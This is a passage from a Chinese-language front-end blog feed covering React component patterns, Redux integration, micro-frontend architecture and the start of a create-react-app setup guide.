Fragments</h4><p>React常常是一个组件返回多个元素，Fragments允许你将子列表分组，而无需向DOM添加额外节点。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;React.Fragment&gt;</span><br><span class="line">      &lt;ChildA /&gt;</span><br><span class="line">      &lt;ChildB /&gt;</span><br><span class="line">    &lt;<span class="regexp">/React.Fragment&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 短语法：空标签</span></span><br><span class="line"><span class="regexp">return (</span></span><br><span class="line"><span class="regexp">  &lt;&gt;</span></span><br><span class="line"><span class="regexp">    &lt;td&gt;hello&lt;/</span>td&gt;</span><br><span class="line">    &lt;td&gt;world&lt;<span class="regexp">/td&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-7-高阶组件"><a href="#1-7-高阶组件" class="headerlink" title="1.7 高阶组件"></a>1.7 高阶组件</h4><ul><li>在挂载时，想DataSource添加一个更改侦听器</li><li>在侦听器内部，当数据源发生变化时，调用setState</li><li>在卸载时，删除侦听器<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> CommentListWithSubscription = withSubscription(</span><br><span class="line">  CommonList,</span><br><span class="line">  (DataSource) =&gt; DataSource.getComments()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withSubscription</span>(<span class="params">WrappedComponent, selectData</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">      <span class="keyword">super</span>(props);</span><br><span class="line">      <span class="keyword">this</span>.state = &#123;</span><br><span class="line">        data: selectData(DataSource, props)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentDidMount() &#123;</span><br><span class="line">      DataSoure.addChangeListener(<span class="keyword">this</span>.handleChange)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentWillUnmout() &#123;</span><br><span class="line">      DataSource.removeChangeListener(<span class="keyword">this</span>.handleChange)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handleChange = <span class="function"><span class="params">()</span> =&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">        data: selectData(DataSource, <span class="keyword">this</span>.props)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">WrappedComponent</span> <span class="attr">data</span>=<span class="string">&#123;this.state.data&#125;</span> &#123;<span class="attr">...this.props</span>&#125;&gt;</span></span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-8-在一个模块中导出多个多组件"><a href="#1-8-在一个模块中导出多个多组件" class="headerlink" title="1.8 在一个模块中导出多个多组件"></a>1.8 在一个模块中导出多个多组件</h4><p><br></p><h3 id="2-结合redux"><a href="#2-结合redux" class="headerlink" title="2. 结合redux"></a>2. 结合redux</h3><table><thead><tr><th></th><th style="text-align:center">展示组件</th><th style="text-align:right">容器组件</th></tr></thead><tbody><tr><td>定义</td><td style="text-align:center">不关心数据来源和如何变化，传入什么就渲染什么</td><td style="text-align:right">监听redux store变化并过滤出要显示的数据</td></tr><tr><td>作用</td><td style="text-align:center">描述如何展示（骨架、样式）</td><td style="text-align:right">描述如何运行（数据获取、状态更新）</td></tr><tr><td>直接使用Redux</td><td style="text-align:center">否</td><td style="text-align:right">是</td></tr><tr><td>数据来源</td><td style="text-align:center">props</td><td style="text-align:right">监听Redux state</td></tr><tr><td>数据修改</td><td style="text-align:center">从props调用回调函数</td><td style="text-align:right">向Redux派发actions</td></tr><tr><td>调用方式</td><td style="text-align:center">手动</td><td style="text-align:right">通常由React Redux生成</td></tr></tbody></table><h4 id="2-1-无状态组件"><a href="#2-1-无状态组件" class="headerlink" title="2,1 无状态组件"></a>2,1 无状态组件</h4><p>使用函数式无状态组件，如果需要使用本地state, 生命周期方法，性能优化，可以将它们转成class。<br>技术上你可以直接使用<code>store.subscribe()</code>来编写容器组件，但不建议这样做，应使用React Redux的<code>connect()</code>方法生成容器组件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Todo = <span class="function">(<span class="params">&#123; onClick, completed, text&#125;</span>) =&gt;</span> (</span><br><span class="line">  &lt;li</span><br><span class="line">    onClick=&#123;onClick&#125;</span><br><span class="line">    style=&#123;&#123;<span class="attr">color</span>: completed ? <span class="string">'green'</span> : <span class="string">'red'</span>&#125;&#125;</span><br><span class="line">  &gt;</span><br><span class="line">    &#123; text &#125;</span><br><span class="line">  &lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const TodoList = (&#123; todos, onTodoClick &#125;) =&gt; (</span></span><br><span class="line"><span class="regexp">  &lt;ul&gt;</span></span><br><span class="line"><span class="regexp">    &#123; todos.map((todo, index) =&gt; (</span></span><br><span class="line"><span class="regexp">      &lt;Todo key=&#123;index&#125; &#123;...todo&#125; onClick=&#123;() =&gt; onTodoClick(index)&#125;/</span>&gt;</span><br><span class="line">    ))&#125;</span><br><span class="line">  &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">)</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const Link = (&#123; active, children, onClick&#125;) =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  if (active) &#123;</span></span><br><span class="line"><span class="regexp">    return &lt;span&gt;&#123;children&#125;&lt;/</span>span&gt;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;a href=<span class="string">""</span> onClick=&#123;e=&gt; &#123;e.preventDefault();onClick();&#125;&#125;&gt;&#123;children&#125;&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-有状态组件"><a href="#2-2-有状态组件" class="headerlink" title="2.2 有状态组件"></a>2.2 有状态组件</h4><p>有状态组件，就是使用<code>store.subscribe()</code>从Redux state树中读取部分数据，并通过props来把这些数据提供给要渲染的组件。但建议使用React Redux库的<code>connect()</code>来生成，这个方法做了避免了很多不必要的重复渲染。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Home</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-组件传值"><a href="#3-组件传值" class="headerlink" title="3. 组件传值"></a>3. 组件传值</h3><h4 id="3-1-共同父组件"><a href="#3-1-共同父组件" class="headerlink" title="3.1 共同父组件"></a>3.1 共同父组件</h4><p>状态提升，将多个组件中需要共享的state向上移动到他们的最近共同父组件中，便可实现共享state</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    scale : <span class="string">''</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleChange(val) =&gt; &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;<span class="attr">scale</span>: val&#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; scale &#125; = <span class="keyword">this</span>.state;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;ChildOne scale=&#123;scale&#125; onScaleChange=&#123;<span class="keyword">this</span>.handleChange&#125; /&gt;</span><br><span class="line">      &lt;ChildTwo scale=&#123;scale&#125; onScaleChange=&#123;<span class="keyword">this</span>.handleChange&#125; /&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用下面技巧，可以减少props的传递<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Page</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; user &#125; = props;</span><br><span class="line">  <span class="keyword">const</span> userLink = (</span><br><span class="line">    &lt;Link href=&#123;user.permalink&#125;&gt;</span><br><span class="line">      &lt;Avatar user=&#123;user&#125; size=&#123;props.avatarSize&#125; /&gt;</span><br><span class="line">    &lt;<span class="regexp">/Link&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">  return &lt;PageLayout userLink=&#123;useLink&#125; /</span>&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-Context-公用属性"><a href="#3-2-Context-公用属性" class="headerlink" title="3.2 Context 公用属性"></a>3.2 Context 公用属性</h4><p>React中数据是通过props属性自上而下(由父及子)进行传递的，但这种做法对于某些类型的属性而言是极其繁琐的（如：地区偏好，UI主题），这些属性是应用程序中许多组件都需要的。Context提供了一种在组件之间共享此值的方式，而不必显示地通过组件树的逐层传递props。</p><p><br></p><h4 id="3-3-Refs"><a href="#3-3-Refs" class="headerlink" title="3.3 Refs"></a>3.3 Refs</h4><p>将DOM Refs暴露给父组件。你希望在父组件汇总引用子节点的DOM节点。<br>不能Ref高阶组件（connect到redux的HOC组件），ref出来的会是高阶组件，不是本组件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    visible: <span class="literal">false</span>,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  showModal() &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      visible: <span class="literal">true</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &#123; <span class="keyword">this</span>.state.visible &amp;&amp; <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>modal<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>&#125;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">class Parent extends React.Component&#123;</span></span><br><span class="line"><span class="regexp">  constructor(props)&#123;</span></span><br><span class="line"><span class="regexp">    super(props);</span></span><br><span class="line"><span class="regexp">    this.myRef = React.createRef()</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">  handleClick = () =&gt; &#123;</span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 调用子组件方法</span></span><br><span class="line"><span class="regexp">    const node = this.myRef.current;</span></span><br><span class="line"><span class="regexp">    node.showModal();</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">  render() &#123;</span></span><br><span class="line"><span class="regexp">    return (</span></span><br><span class="line"><span class="regexp">      &lt;&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;handleClick&#125;&gt;触发子组件方法&lt;/</span>button&gt;</span><br><span class="line">        &lt;Child ref=&#123;<span class="keyword">this</span>.myRef&#125; /&gt; </span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-4-redux"><a href="#3-4-redux" class="headerlink" title="3.4 redux"></a>3.4 redux</h4><p>配合dva使用</p><p><br></p><h4 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h4><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://github.com/xitu/gold-miner/blob/master/TODO/our-best-practices-for-writing-react-components.md" target="_blank" rel="noopener">https://github.com/xitu/gold-miner/blob/master/TODO/our-best-practices-for-writing-react-components.md</a><br><a href="https://juejin.im/post/5a73d6435188257a6a789d0d" target="_blank" rel="noopener">https://juejin.im/post/5a73d6435188257a6a789d0d</a></p><ul><li><a href="https://www.jianshu.com/p/50fe3fb9f7c3" target="_blank" rel="noopener">React新生命周期–getDerivedStateFromProps</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>微前端</title>
      <link href="/2019/06/21/%E5%BE%AE%E5%89%8D%E7%AB%AF/"/>
      <url>/2019/06/21/%E5%BE%AE%E5%89%8D%E7%AB%AF/</url>
      <content type="html"><![CDATA[<h3 id="1-微前端是什么"><a href="#1-微前端是什么" class="headerlink" title="1. 微前端是什么"></a>1. 微前端是什么</h3><p>微前端主要借鉴后端微服务的概念。简单地说，就是将一个巨无霸（Monolith）的前端工程拆分成一个一个的小工程。它们完全具备独立的开发、运行能力。整个系统就将由这些小工程协同合作，实现所有页面的展示与交互。</p><p>可以跟微服务这么对比着去理解：</p><table><thead><tr><th>微服务</th><th>微前端</th></tr></thead><tbody><tr><td>一个微服务就是由一组接口构成，接口地址一般是 URL。当微服务收到一个接口的请求时，会进行路由找到相应的逻辑，输出响应内容。</td><td>一个微前端则是由一组页面构成，页面地址也是 URL。当微前端收到一个页面 URL 的请求时，会进行路由找到相应的组件，渲染页面内容。</td></tr><tr><td>后端微服务会有一个网关，作为单一入口接收所有的客户端接口请求，根据接口 URL 与服务的匹配关系，路由到对应的服务。</td><td>微前端则会有一个加载器，作为单一入口接收所有页面 URL 的访问，根据页面 URL 与微前端的匹配关系，选择加载对应的微前端，由该微前端进行进行路由响应 URL。</td></tr></tbody></table><h4 id="1-1-微前端架构"><a href="#1-1-微前端架构" class="headerlink" title="1.1 微前端架构"></a>1.1 微前端架构</h4><p>微前端架构一般可以由以下几种方式进行：</p><ul><li>使用 HTTP 服务器的路由来重定向多个应用</li><li>在不同的框架之上设计通讯、加载机制，诸如 Mooa 和 Single-SPA</li><li>通过组合多个独立应用、组件来构建一个单体应用</li><li>iFrame。使用 iFrame 及自定义消息传递机制</li><li>使用纯 Web Components 构建应用</li><li>结合 Web Components 构建</li></ul><p><br></p><h3 id="2-为什么要用微前端"><a href="#2-为什么要用微前端" class="headerlink" title="2. 为什么要用微前端"></a>2. 为什么要用微前端</h3><p>主要从下面几个角度</p><ul><li>打包速度</li><li>页面加载速度</li><li>多人多地协作</li><li>sass产品定制化</li><li>产品拆分</li></ul><p><br></p><h4 id="2-1-打包速度"><a href="#2-1-打包速度" class="headerlink" title="2.1 打包速度"></a>2.1 打包速度</h4><p>工程越来越大，打包越来越慢。想想edx跑完整个打包流程，需要多少时间？编译一次edx静态资源就需要20-30分钟。</p><blockquote><p>在 6 个月前，我们的 B 端工程那会儿还是一个 Monolith。当时已经有 20 多个依赖、60 多个公共组件、200 多个页面，对接 700 多个接口。我们使用了 Webpack 2，并启用 DLL Plugin、HappyPack 4。在我的个人主机上使用 4 线程编译，大概要 5 分钟。而如果不拆分，算下来现在我们已经有近 400 个页面，对接1000 多个接口。<br>这个时间意味着什么？它不仅会耽误我们开发人员的时间，还会影响整个团队的效率。上线时，在 Docker、CI 等环境下，耗时还会被延长。如果部署后出几个 Bug，要线上立即修复，那就不知道要熬到几点了。<br>在使用微前端改造后，目前我们已经有 26 个微前端工程，平均打包时间在 30-45 秒之间。</p></blockquote><p><br></p><h4 id="2-2-多人多地协作"><a href="#2-2-多人多地协作" class="headerlink" title="2.2 多人多地协作"></a>2.2 多人多地协作</h4><p>使用微前端后，代码冲突提交被阻塞的风险，就平摊到各个工程上去了。</p><blockquote><p>在协作上，我们在全国有三个地方的前端团队，这么多人在同一个工程里开发，遭遇代码冲突的概率会很频繁，而且冲突的影响面比较大。如果代码中出现问题，导致 CI 失败，所有其他人的代码提交与更新也都会被阻塞。</p></blockquote><p><br></p><h4 id="2-3-Sass产品-定制化与本地化"><a href="#2-3-Sass产品-定制化与本地化" class="headerlink" title="2.3 Sass产品 - 定制化与本地化"></a>2.3 Sass产品 - 定制化与本地化</h4><p>内心想做 SaaS 产品，但客户总是要做定制化。</p><p><em>定制化</em> 往往意味着，在代码里揉进“定制的业务逻辑”。<br><em>本地化</em> 就会有代码安全方面的考量，怎样不把全部源代码给客户，就能实现定制？</p><p>通过微前端技术，我们可以很容易达到本地化代码安全的下限——只给客户他所购买的模块的前端源码。定制化里最简单的独立新模块也变得简单：交付团队增加一个新的微前端工程即可，不需要揉进现有研发工程中。</p><p><br></p><h3 id="3-怎样整合微前端app"><a href="#3-怎样整合微前端app" class="headerlink" title="3. 怎样整合微前端app"></a>3. 怎样整合微前端app</h3><p>在微前端的方案里，有几个我们必须要解决的问题：</p><ul><li>一个前端需要对应多个后端</li><li><p>提供一套应用注册机制，完成应用的无缝整合</p><ul><li>怎样将不同业务子系统集中到一个大平台上，统一对外开放？</li><li>如何给不同用户赋予权限让其能够访问平台的特定业务模块同时禁止其访问无权限的业务模块？</li><li>如何快速接入新的子系统，并对子系统进行版本管理，保证功能同步？</li></ul></li><li><p>构建时集成应用和应用独立发布部署</p></li></ul><p><br></p><h4 id="3-1-入口项目"><a href="#3-1-入口项目" class="headerlink" title="3.1 入口项目"></a>3.1 入口项目</h4><p>最终线上运行的是一个单页应用，而项目开发中要求应用独立。因此我们新建了一个入口项目，用于整合各个应用。入口项目(Portal)，除了提供“子项目”注册、合并功能外，还提供一些公共支持，如</p><ul><li><p><em>用户登录机制</em><br>将用户的统一登录和认证问题交给了SSO，所有的项目的后端Server都要接入SSO校验登录状态，从而保障业务系统间用户安全认证的一致性。</p></li><li><p><em>引用公共库</em><br>每一个业务工程都是一个独立的前端工程，所以里面会有一些相同的依赖，如 Vue、moment、lodash 等。如果将这些内容都打包到各自的 vendor.js 里，则势必会导致代码冗余太多，浏览器运行内存压力增大。我们把这些公共依赖、公共组件、CSS、Fonts 等都放到一个工程里，由该工程进行打包，将依赖、组件 export，并以 UMD 的方式注入到全局。</p></li><li><p><em>菜单权限获取</em><br><img src="/2019/06/21/微前端/1.png" style="max-width: 500px"></p></li><li><p>全局异常处理</p></li><li>全局数据打点</li></ul><p><br></p><h4 id="3-2-路由分发应用"><a href="#3-2-路由分发应用" class="headerlink" title="3.2 路由分发应用"></a>3.2 路由分发应用</h4><p>在单页面应用中，我们会依据路由分发组件。而在微前端项目中，我们需要把路由分发到不同的应用中。</p><ul><li><em>Http反向代理</em><br>这通常可以通过HTTP 服务器的反向代理来实现。但是这种方式看上去更像是多个前端应用的聚合，我们只是将这些不同的应用拼凑到一起，使他们看起来像是一个完整的整体。但是，每次用户从 A 应用到 B 应用的时候，都需要刷新一下页面。</li></ul><ul><li><p><em>客户端javascript异步加载</em><br>这种方式就是在客户端浏览器通过 Ajax 加载应用程序，然后将不同模块的内容插入到对应的 div 中，而且还必须手动克隆每个 script 的标记才能使其工作。<br>“子项目”对外输出不需要入口HTML页面，只需要输出的资源文件即可，资源文件包括js、css、fonts和imgs等。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadPage</span> (<span class="params">element</span>) </span>&#123;</span><br><span class="line">  [].forEach.call(element.querySelectorAll(<span class="string">'script'</span>), <span class="function"><span class="keyword">function</span> (<span class="params">nonExecutableScript</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">    script.setAttribute(<span class="string">"src"</span>, nonExecutableScript.src);</span><br><span class="line">    script.setAttribute(<span class="string">"type"</span>, <span class="string">"text/javascript"</span>);</span><br><span class="line">    element.appendChild(script);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.querySelectorAll(<span class="string">'.load-app'</span>).forEach(loadPage);</span><br></pre></td></tr></table></figure></li><li><p><em>Web Components</em><br>react，vue的可重用的组件。每个组件都是独立开发的，主应用程序项目利用它们组装成最终的应用程序。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Header</span> <span class="keyword">extends</span> <span class="title">HTMLElement</span> </span>&#123;</span><br><span class="line">  attachedCallback() &#123;</span><br><span class="line">    ReactDOM.render(<span class="xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span>, this.createShadowRoot());</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">document.registerElement('microfrontends-header', Header);</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-一些框架"><a href="#4-一些框架" class="headerlink" title="4. 一些框架"></a>4. 一些框架</h3><h4 id="4-1-single-spa"><a href="#4-1-single-spa" class="headerlink" title="4.1 single-spa"></a>4.1 single-spa</h4><p>single-spa is a framework for bringing together multiple javascript microfrontends in a frontend application. </p><p>搭建一个single-spa来加载react+vue两个app: <a href="https://dev.to/dabit3/building-micro-frontends-with-react-vue-and-single-spa-52op" target="_blank" rel="noopener">https://dev.to/dabit3/building-micro-frontends-with-react-vue-and-single-spa-52op</a><br>官方文档：<a href="https://single-spa.js.org/docs/getting-started-overview.html" target="_blank" rel="noopener">https://single-spa.js.org/docs/getting-started-overview.html</a><br>官方Demo : <a href="https://single-spa.surge.sh/" target="_blank" rel="noopener">https://single-spa.surge.sh/</a><br>Demo仓库: <a href="https://github.com/CanopyTax/single-spa-examples" target="_blank" rel="noopener">https://github.com/CanopyTax/single-spa-examples</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:CanopyTax/single-spa-examples.git</span><br><span class="line">cd single-spa-examples</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> Install yarn at https://yarnpkg.com/lang/en/docs/install/</span><br><span class="line">yarn</span><br><span class="line">yarn build</span><br><span class="line">yarn start</span><br><span class="line">open http://localhost:8080</span><br></pre></td></tr></table></figure><h4 id="4-2"><a href="#4-2" class="headerlink" title="4.2"></a>4.2</h4><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5cadd7835188251b2f3a4bb0" target="_blank" rel="noopener">微前端实践</a></li><li><a href="https://blog.csdn.net/lizhipeng123321/article/details/81868136" target="_blank" rel="noopener">前端微服务整合之‘‘插拔式架构’‘实现方案</a></li><li><a href="https://www.cnblogs.com/meituantech/p/9604591.html" target="_blank" rel="noopener">用微前端的方式搭建类单页应用</a></li><li><a href="https://juejin.im/post/5b45d0ea6fb9a04fa42f9f1a" target="_blank" rel="noopener">实施微前端的六种方式</a></li><li><a href="https://www.jianshu.com/p/1f409df7de45" target="_blank" rel="noopener">「微前端」- 将微服务理念扩展到前端开发（实践篇）</a></li></ul>]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>搭建React项目</title>
      <link href="/2019/06/13/%E6%90%AD%E5%BB%BAReact%E9%A1%B9%E7%9B%AE/"/>
      <url>/2019/06/13/%E6%90%AD%E5%BB%BAReact%E9%A1%B9%E7%9B%AE/</url>
      <content type="html"><![CDATA[<h3 id="1-create-react-app"><a href="#1-create-react-app" class="headerlink" title="1. create-react-app"></a>1. create-react-app</h3><h4 id="1-安装启动"><a href="#1-安装启动" class="headerlink" title="1. 安装启动"></a>1. 安装启动</h4><p>环境 Node &gt;= 6 和 npm &gt;= 5.2<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 